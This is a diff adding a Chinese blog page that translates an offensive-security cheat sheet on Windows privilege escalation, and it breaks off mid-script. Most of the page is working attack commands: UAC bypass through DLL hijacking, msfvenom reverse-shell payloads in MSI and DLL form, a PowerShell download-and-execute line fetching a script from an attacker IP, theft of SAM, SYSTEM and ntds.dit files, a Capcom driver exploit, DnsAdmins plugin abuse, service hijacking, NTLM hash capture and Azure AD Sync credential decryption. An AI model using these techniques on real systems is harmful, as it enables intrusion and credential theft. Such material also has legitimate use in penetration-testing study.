@@ -1,0 +1,1073 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shiyan">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows特权提升-h4rithd-2024.04.03版本">
+<meta property="og:url" content="https://sh1yan.top/2024/06/02/Windows-privilege-escalation-h4rithd-20240403/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="笔记说明：该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-02T15:50:55.000Z">
+<meta property="article:modified_time" content="2024-06-02T15:01:09.302Z">
+<meta property="article:author" content="shiyan">
+<meta property="article:tag" content="Offensive security">
+<meta property="article:tag" content="Windows privilege escalation">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Windows特权提升-h4rithd-2024.04.03版本 - sh1yan&#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"sh1yan.top","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>sh1yan&#39;blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/yqlj/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-th-large"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/open-source/" target="_self">
+                    
+                    <span>我开源的安全项目</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/rt-cmd/" target="_self">
+                    
+                    <span>反弹shell命令集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/reverse-shell/" target="_self">
+                    
+                    <span>简易反弹shell集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/P2note/" target="_self">
+                    
+                    <span>综合安全工具集合</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/WebDeveloper/" target="_self">
+                    
+                    <span>网站开发者工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/linux-command/" target="_self">
+                    
+                    <span>Linux命令工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/CyberChef/" target="_self">
+                    
+                    <span>CyberChef工具箱</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="/Quick-Reference/" target="_self">
+                    
+                    <span>开发者速查备忘录</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Windows特权提升-h4rithd-2024.04.03版本"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-02 23:50" pubdate>
+          2024年6月2日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          33k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          274 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Windows特权提升-h4rithd-2024.04.03版本</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="笔记说明："><a href="#笔记说明：" class="headerlink" title="笔记说明："></a>笔记说明：</h1><p>该笔记是国外进攻性爱好者 h4rithd 在 gitbook 上记录的备忘笔记，我整体翻译了注释的内容，并根据个人打靶学习情况，增加或删除了一部分内容，至此放置博客上留作后续复习使用，以及方便各位浏览到我博客的安全爱好者参考使用。</p>
+<span id="more"></span>  
+
+<h1 id="PrivilageEsc-Windows-👑"><a href="#PrivilageEsc-Windows-👑" class="headerlink" title="PrivilageEsc Windows 👑"></a>PrivilageEsc Windows 👑</h1><p>检查列表：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation">https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation</a></p>
+<p>点击这里了解更多！<a target="_blank" rel="noopener" href="https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">有效负载AllTheThings</a></p>
+<h2 id="01-常见技巧"><a href="#01-常见技巧" class="headerlink" title="01.常见技巧"></a>01.常见技巧</h2><h3 id="01-1-UAC绕过"><a href="#01-1-UAC绕过" class="headerlink" title="01.1 UAC绕过"></a>01.1 UAC绕过</h3><ul>
+<li><strong>DLL劫持UAC绕过</strong>。 (SystemPropertiesAdvanced.exe) 单击<a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">此处</a>了解更多信息！</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Source : https://egre55.github.io/system-properties-uac-bypass/</span><br><span class="hljs-comment">## ------------------| 检查一下我们是不是存在漏洞？</span><br><span class="hljs-built_in">IWR</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.38</span>/sigcheck64.exe <span class="hljs-literal">-outfile</span> sigcheck.exe<br>.\sigcheck.exe <span class="hljs-literal">-accepteula</span> <span class="hljs-literal">-m</span> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe | findstr autoElevate<br><span class="hljs-comment">## 如果是真的；我们可以出发了！！</span><br><br><span class="hljs-comment">## ------------------| 创建后门dll文件</span><br>https://docs.h4rithd.com/tools/shells<span class="hljs-literal">-payloads</span><span class="hljs-comment">#09.-dll-hijack</span><br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">copy</span> srrstr.dll C:\Users\&lt;USER&gt;\appdata\local\microsoft\windowsapps\srrstr.dll<br>cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe <br><span class="hljs-comment">### 如果您收到任何错误，即“此操作需要一个交互式窗口”。 </span><br><span class="hljs-comment">### 您应该使用任何类型的C2（使用GreatSCT/MBuild来启动MeterMeter）        </span><br><br><span class="hljs-comment">## ------------------| 与交互式外壳一起使用</span><br><span class="hljs-comment">### 使用以下方法创建有效载荷并获得外壳</span><br><span class="hljs-comment">### https://docs.h4rithd.com/tools/shells-payloads#10.-greatsct</span><br><span class="hljs-comment">### 将进程迁移到explorer.exe</span><br>meterpreter &gt; <span class="hljs-built_in">ps</span> <span class="hljs-literal">-S</span> explorer<br>meterpreter &gt; migrate &lt;PID&gt;<br>meterpreter &gt; shell<br>cmd /c C:\Windows\SysWow64\SystemPropertiesAdvanced.exe<br></code></pre></td></tr></table></figure>
+
+<h3 id="01-2-如有以下用户权限，即可提权"><a href="#01-2-如有以下用户权限，即可提权" class="headerlink" title="01.2 如有以下用户权限，即可提权"></a>01.2 如有以下用户权限，即可提权</h3><ul>
+<li><code>AlwaysInstallElevated</code>查看 - MSI 安装提权漏洞<ul>
+<li><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/">查看这篇文章了解更多详细信息。</a></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 如何检查</span><br>reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer<br>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer<br><br><span class="hljs-comment">## 从名为“AlwaysInstallElevated”的注册表存在的输出 </span><br><span class="hljs-comment">## 在双字（REG_WORD）值为0x1的情况下， </span><br><span class="hljs-comment">## 这意味着启用了AlwaysInstallElevated策略。</span><br><span class="hljs-comment">## 任何用户都可以运行msi文件。</span><br><br><span class="hljs-comment">## ------------------| Exploit </span><br><span class="hljs-comment">## 创建msfvenom负载</span><br>msfvenom <span class="hljs-literal">-p</span> windows/meterpreter/reverse_tcp lhost=&lt;IP&gt; lport=&lt;PORT&gt; <span class="hljs-operator">-f</span> msi &gt; pw3n.msi      <br><span class="hljs-comment">## or</span><br>msfvenom <span class="hljs-literal">-p</span> windows/x64/exec CMD=<span class="hljs-string">&quot;cmd /c powershell iex(new-object net.webclient).downloadstring(&#x27;http://10.14.14.7/shell.ps1&#x27;)&quot;</span> <span class="hljs-operator">-f</span> msi &gt; pw3n.msi  <br><br><span class="hljs-comment">## 在Windows命令提示符下执行MSI包文件</span><br>msiexec /quiet /qn /i pw3n.msi<br><span class="hljs-comment">## /quiet = 在安装过程中禁止向用户发送任何消息</span><br><span class="hljs-comment">## /qn = No GUI</span><br><span class="hljs-comment">## /i = 常规（与管理）安装</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果我们在<code>LOCAL SERVICE</code>或<code>NETWORK SERVICE</code></li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| How to check</span><br>whoami /all<br><span class="hljs-comment">## nt authority\local service &lt;--</span><br><br><span class="hljs-comment">## ------------------| 检查域环境权限</span><br><span class="hljs-built_in">wget</span> https://github.com/itm4n/FullPowers/releases/download/v0.<span class="hljs-number">1</span>/FullPowers.exe<br><span class="hljs-comment">## 将此上传到计算机</span><br>.\FullPowers.exe<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>SeBackupPrivilege</code>并<code>SeRestorePrivilege</code>有？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 如何检查已启用</span><br>whoami /all | findstr <span class="hljs-string">&quot;SeBackupPrivilege SeRestorePrivilege&quot;</span><br><br><span class="hljs-comment">## ------------------| 将这些SYSTEM配置单元复制到当前目录</span><br>reg save HKLM\SYSTEM SYSTEM<br>reg save HKLM\SAM SAM<br><br><span class="hljs-comment">#### 然后我们需要复制Active Directory域数据库，也称为ntds.dit</span><br><br><span class="hljs-comment">## ------------------| 在本地创建磁盘卷影脚本</span><br><span class="hljs-built_in">set</span> verbose on<br><span class="hljs-built_in">set</span> metadata C:\Windows\Temp\meta.cab<br><span class="hljs-built_in">set</span> context clientaccessible<br><span class="hljs-built_in">set</span> context persistent<br><span class="hljs-keyword">begin</span> backup<br>add volume C: alias cdrive<br>create<br>expose %cdrive% E:<br><span class="hljs-keyword">end</span> backup<br><br><span class="hljs-comment">## ------------------| 将脚本转换为Windows格式并上传。</span><br>unix2dos script.txt<br><br><span class="hljs-comment">## ------------------| 使用Diskshadow备份C驱动器</span><br>diskshadow.exe /s script.txt<br><span class="hljs-comment">## 现在可以通过E:驱动器访问整个文件系统</span><br><span class="hljs-built_in">ls</span> E:<br><br><span class="hljs-comment">## ------------------| 使用robocopy备份 E:\Windows\ntds\ntds.dit file.</span><br>robocopy /B E:\Windows\ntds\ .\ ntds.dit<br><span class="hljs-comment"># 然后下载所有SAM、SYSTEM和NTDS.DIT文件，然后可以使用secretsdump.py获取admini哈希  </span><br><br><span class="hljs-comment">## ------------------| 使用 wbadmin.exe</span><br><span class="hljs-comment">## 在samba上使用存档smb</span><br><span class="hljs-comment">## smb共享，该共享需要格式化为NTFS/ReFS。请按照以下命令进行操作。</span><br>dd <span class="hljs-keyword">if</span>=/dev/zero of=ntfs.disk bs=<span class="hljs-number">320</span>M count=<span class="hljs-number">2</span><br>losetup <span class="hljs-literal">-fP</span> ntfs.disk<br>losetup <span class="hljs-literal">-a</span><br>mkfs.ntfs /dev/loop0<br><span class="hljs-built_in">mount</span> /dev/loop0 ./<br><br><span class="hljs-built_in">echo</span> y | wbadmin <span class="hljs-built_in">start</span> backup <span class="hljs-literal">-backuptarget</span>:\\<span class="hljs-number">10.10</span>.<span class="hljs-number">14.22</span>\share\ <span class="hljs-literal">-include</span>:c:\windows\ntds\ntds.dit<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你有<code>SeLoadDriverPrivilege</code>？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 下载并上传以下文件到机器</span><br><span class="hljs-built_in">wget</span> https://github.com/FuzzySecurity/Capcom<span class="hljs-literal">-Rootkit</span>/raw/master/Driver/Capcom.sys<br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/Precompiled<span class="hljs-literal">-Binaries</span>/main/Capcom/EoPLoadDriver.exe   <br><span class="hljs-built_in">wget</span> https://raw.githubusercontent.com/h4rithd/Precompiled<span class="hljs-literal">-Binaries</span>/main/Capcom/ExploitCapcom.exe   <br><br><span class="hljs-comment">## ------------------| 创建有效负载并上传</span><br>msfvenom  <span class="hljs-literal">--platform</span> windows <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> exe &gt; h4rithd.exe  <br><br><span class="hljs-comment">## ------------------| Exploit</span><br><span class="hljs-built_in">copy</span> h4rithd.exe C:\Windows\Temp\h4rithd.exe <span class="hljs-comment"># 运行前，先启动listner</span><br>.\ExploitCapcom.exe<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果用户在<code>DnsAdmins</code>组中？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Create payload</span><br>msfvenom <span class="hljs-literal">-a</span> x64 <span class="hljs-literal">-p</span> windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; <span class="hljs-operator">-f</span> dll &gt; h4rithd.dll   <br><br><span class="hljs-comment">## ------------------| Create SMB share on local machine </span><br>impacket<span class="hljs-literal">-smbserver</span> share ./<br><br><span class="hljs-comment">## ------------------| 在拥有的远程盒子上执行此操作</span><br>dnscmd.exe <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> /config /serverlevelplugindll \\&lt;IP&gt;\&lt;Path<span class="hljs-literal">-To-Dll-File</span>&gt;<br>sc.exe stop dns<br><span class="hljs-comment">## 创建netcat listner，然后运行下方命令 </span><br>sc.exe <span class="hljs-built_in">start</span> dns<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果您有<code>GenericAll</code>用户 jorden</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| 为用户Jorden启用预身份验证 </span><br><span class="hljs-built_in">Get-ADUser</span> jorden | <span class="hljs-built_in">Set-ADAccountControl</span> <span class="hljs-literal">-DoesNotRequirePreAuth</span> <span class="hljs-variable">$true</span><br><br><span class="hljs-comment">## ------------------| Then run this</span><br>impacket<span class="hljs-literal">-GetNPUsers</span> htb.local/jorden <span class="hljs-literal">-dc-ip</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">3.203</span> <span class="hljs-literal">-no-pass</span>  <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果您有<code>GenericWrite</code>任何服务</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## ------------------| Check the command</span><br>sc.exe <br><br><span class="hljs-comment">## ------------------| 如果它是成功的，那么Exploit〔Space must〕</span><br>sc.exe config UsoSVC binpath= <span class="hljs-string">&quot;\&quot;</span>c:\windows\system32\cmd.exe /c powershell C:\\Windows\\system32\\spool\\drivers\\color\\rev.ps1\<span class="hljs-string">&quot;&quot;</span>   <br>sc.exe stop UsoSVC <br>sc.exe config UsoSVC <span class="hljs-built_in">start</span>=auto<br>sc.exe <span class="hljs-built_in">start</span> UsoSVC <br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你有<code>xp_dirtree</code>？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Turn on responder</span><br>sudo responder <span class="hljs-literal">-i</span> tun0<br><br><span class="hljs-comment">## Execute </span><br>sqlcmd <span class="hljs-literal">-Q</span> <span class="hljs-string">&quot;xp_dirtree \\YourIP\test&quot;</span><br><br><span class="hljs-comment">## Get the NTLM hash and crack with </span><br>hashcat <span class="hljs-literal">-m</span> <span class="hljs-number">5600</span> hash /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li>如果你在<code>Azure Admins</code>组里？</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">## Read this blog</span><br>https://blog.xpnsec.com/azu<span class="hljs-built_in">read-connect</span><span class="hljs-literal">-for-redteam</span>/<br><br><span class="hljs-comment">## 方法论</span><br><span class="hljs-variable">$client</span> = <span class="hljs-built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="hljs-literal">-ArgumentList</span> <span class="hljs-string">&quot;Server=localhost;Integrated Security=true;Initial Catalog=ADSync&quot;</span><br><span class="hljs-variable">$client</span>.Open()<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$key_id</span> = <span class="hljs-variable">$reader</span>.GetInt32(<span class="hljs-number">0</span>)<br><span class="hljs-variable">$instance_id</span> = <span class="hljs-variable">$reader</span>.GetGuid(<span class="hljs-number">1</span>)<br><span class="hljs-variable">$entropy</span> = <span class="hljs-variable">$reader</span>.GetGuid(<span class="hljs-number">2</span>)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()<br><span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">&quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#x27;AD&#x27;&quot;</span><br><span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()<br><span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span><br><span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">0</span>)<br><span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">1</span>)<br><span class="hljs-variable">$reader</span>.Close()<br><br><span class="hljs-built_in">add-type</span> <span class="hljs-literal">-path</span> <span class="hljs-string">&#x27;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll&#x27;</span><br><span class="hljs-variable">$km</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager<br><span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)<br><span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetActiveCredentialKey([<span class="hljs-type">ref</span>]<span class="hljs-variable">$key</span>)<br><span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span><br><span class="hljs-variable">$km</span>.GetKey(<span class="hljs-number">1</span>, [<span 